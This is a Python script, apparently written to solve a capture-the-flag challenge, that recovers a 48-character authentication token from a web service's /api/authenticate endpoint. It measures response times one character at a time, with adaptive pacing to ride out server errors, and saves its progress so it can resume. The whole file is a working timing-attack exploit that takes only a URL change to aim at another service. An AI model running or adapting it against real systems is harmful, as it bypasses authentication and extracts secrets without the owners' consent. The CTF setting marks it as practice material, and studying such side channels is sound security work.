#!/usr/bin/env python3
"""Timing attack v2 against NeuroServe /api/authenticate.

Learnings from recon:
- Token: 48 alphanumerics, POST {"token": ...} -> 401 JSON on failure.
- 502s occur at any request rate (per-request noise); treat them as cheap
  retries: short pause, same keep-alive session, no exponential blowup.
- Keep one Session alive; responses are ~33ms.

Approach per position:
- Screen all 62 chars once (single sample), keep timings.
- Re-test top N leaders until a winner separates cleanly.
State persists in state.json; safe to Ctrl-C and rerun.
"""
import json
import statistics
import string
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io"
URL = BASE + "/api/authenticate"
STATE_FILE = "/home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/script/state.json"

TOKEN_LENGTH = 48
CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase

CADENCE = 2.0        # seconds between request starts (adaptive, AIMD)
CAD_MIN = 1.7
CAD_MAX = 6.0
RETRY_PAUSE = 1.0    # extra pause after a 502
PAD = "0"


def load_state():
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except Exception:
        return {"recovered": "", "log": []}


def save_state(st):
    with open(STATE_FILE, "w") as f:
        json.dump(st, f)


class Client:
    def __init__(self):
        self.s = requests.Session()
        self.s.verify = False
        self.last = 0.0
        self.n502 = 0
        self.nok = 0
        self.cad = CADENCE

    def post(self, token):
        while True:
            wait = self.cad - (time.monotonic() - self.last)
            if wait > 0:
                time.sleep(wait)
            t0 = time.perf_counter()
            try:
                r = self.s.post(URL, json={"token": token}, timeout=25)
            except requests.RequestException:
                self.last = time.monotonic()
                self.cad = min(CAD_MAX, self.cad * 1.3)
                time.sleep(RETRY_PAUSE)
                continue
            ms = (time.perf_counter() - t0) * 1000
            self.last = time.monotonic()
            if r.status_code == 502:
                self.n502 += 1
                self.cad = min(CAD_MAX, self.cad * 1.35)
                time.sleep(RETRY_PAUSE)
                continue
            if r.status_code >= 500:
                self.cad = min(CAD_MAX, self.cad * 1.5)
                time.sleep(2)
                continue
            self.nok += 1
            if self.nok % 8 == 0 and self.cad > CAD_MIN:
                self.cad = max(CAD_MIN, self.cad * 0.93)
            return ms, r


def main():
    st = load_state()
    recovered = st["recovered"]
    c = Client()
    print(f"resuming with {recovered!r}", flush=True)

    while len(recovered) < TOKEN_LENGTH:
        pos = len(recovered)
        print(f"\n=== position {pos+1}/{TOKEN_LENGTH} ===", flush=True)

        # screen
        scores = {}
        for i, ch in enumerate(CHARSET):
            token = recovered + ch + PAD * (TOKEN_LENGTH - pos - 1)
            ms, r = c.post(token)
            if r.status_code == 200:
                print(f"\n*** SUCCESS *** {token}\n{r.text}", flush=True)
                print(f"TOKEN = {token}")
                save_state({**st, "recovered": token})
                sys.exit(0)
            scores[ch] = [ms]
            print(f"  [{i+1:2d}] {ch}: {ms:6.2f}  (502 so far: {c.n502})", flush=True)

        # verify leaders iteratively
        order = sorted(scores, key=lambda k: -statistics.median(scores[k]))
        winners = order[:6]
        print("leaders:", [(ch, round(statistics.median(scores[ch]), 2)) for ch in winners], flush=True)

        decided = False
        rounds = 0
        while not decided and rounds < 6:
            rounds += 1
            for ch in winners:
                token = recovered + ch + PAD * (TOKEN_LENGTH - pos - 1)
                ms, r = c.post(token)
                if r.status_code == 200:
                    print(f"\n*** SUCCESS *** {token}\n{r.text}", flush=True)
                    print(f"TOKEN = {token}")
                    save_state({**st, "recovered": token})
                    sys.exit(0)
                scores[ch].append(ms)
            ranked = sorted(winners, key=lambda k: -statistics.median(scores[k]))
            meds = [(ch, round(statistics.median(scores[ch]), 2)) for ch in ranked]
            best = ranked[0]
            second = statistics.median(scores[ranked[1]])
            margin = statistics.median(scores[best]) - second
            n_best = len(scores[best])
            print(f"  round{rounds}: {meds[:3]} margin={margin:.2f}", flush=True)
            if margin > max(2.5, 3.0 * statistics.pstdev(scores[ranked[1]])):
                decided = True
            # drop clearly-behind candidates
            if len(winners) > 2:
                cutoff = statistics.median(scores[best]) - 15
                winners = [ch for ch in winners if statistics.median(scores[ch]) > cutoff] or [best]

        best_ms = statistics.median(scores[best])
        recovered += best
        st["recovered"] = recovered
        st["log"].append({"pos": pos + 1, "char": best, "ms": round(best_ms, 2)})
        save_state(st)
        print(f"=> picked {best!r} ({best_ms:.2f} ms) | STATE: {recovered!r}", flush=True)

    ms, r = c.post(recovered)
    print(f"FINAL {r.status_code}: {r.text}", flush=True)


if __name__ == "__main__":
    main()
